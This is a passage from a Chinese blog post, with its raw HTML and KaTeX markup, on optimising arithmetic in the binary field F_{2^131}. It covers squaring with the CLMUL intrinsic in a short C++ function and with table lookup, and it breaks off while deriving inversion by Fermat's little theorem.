style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span><span style=\"top:-3.147946em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-1.6238380000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">4</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.036162em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>所以优化后实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// c = a^2</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">gf_pow2</span><span class=\"params\">(<span class=\"type\">uint64_t</span> c[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> a[<span class=\"number\">3</span>])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> e[<span class=\"number\">6</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    __m128i a_tmp, tmp;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">6</span>; i+=<span class=\"number\">2</span>)&#123;</span><br><span class=\"line\">        a_tmp = _mm_set_epi64x(<span class=\"number\">0</span>, a[i &gt;&gt; <span class=\"number\">1</span>]);</span><br><span class=\"line\">        tmp = _mm_clmulepi64_si128(a_tmp, a_tmp, <span class=\"number\">0x00</span>);</span><br><span class=\"line\">        e[i] ^= _mm_cvtsi128_si64(tmp);</span><br><span class=\"line\">        e[i | <span class=\"number\">1</span>] ^= _mm_extract_epi64(tmp, <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">gf_mod</span>(c, e);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"查表\"><a class=\"anchor\" href=\"#查表\">#</a> 查表</h2>\n<p>注意到上一个实现中，将数字分组为 3 组的情况下，平方运算结果恰好为 3 个部分的平方和，只是各自有不同的位置。那么如果分组更小的话，例如一个分组为 8 位大小，那么便可以构造一个 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mn>2</mn><mn>8</mn></msup><mo>=</mo><mn>256</mn></mrow><annotation encoding=\"application/x-tex\">2^8=256</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">6</span></span></span></span> 条记录的表，一次平方运算总共需要查表以及做对应的加法（异或） <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">⌈</mo><mfrac><mn>131</mn><mn>8</mn></mfrac><mo stretchy=\"false\">⌉</mo><mo>=</mo><mn>17</mn></mrow><annotation encoding=\"application/x-tex\">\\lceil\\frac{131}{8}\\rceil=17</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.190108em;vertical-align:-0.345em;\"></span><span class=\"mopen\">⌈</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.845108em;\"><span style=\"top:-2.6550000000000002em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">8</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.345em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mclose\">⌉</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">7</span></span></span></span> 次。</p>\n<h1 id=\"求逆\"><a class=\"anchor\" href=\"#求逆\">#</a> 求逆</h1>\n<h2 id=\"费马小定理\"><a class=\"anchor\" href=\"#费马小定理\">#</a> 费马小定理</h2>\n<p>提交：#886</p>\n<p>费马小定理的推论：任意 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>F</mi><msup><mn>2</mn><mi>m</mi></msup></msub></mrow><annotation encoding=\"application/x-tex\">F_{2^{m}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5935428571428571em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 上的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 逆满足：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msup><mi>x</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><msup><mi>x</mi><mrow><msup><mn>2</mn><mn>131</mn></msup><mo>−</mo><mn>2</mn></mrow></msup></mrow><annotation encoding=\"application/x-tex\">x^{-1}=x^{2^{131}-2}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.864108em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0369199999999998em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0369199999999998em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913142857142857em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>可以通过递归计算，本质上就是和快速幂一个原理：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><msup><mi>x</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" 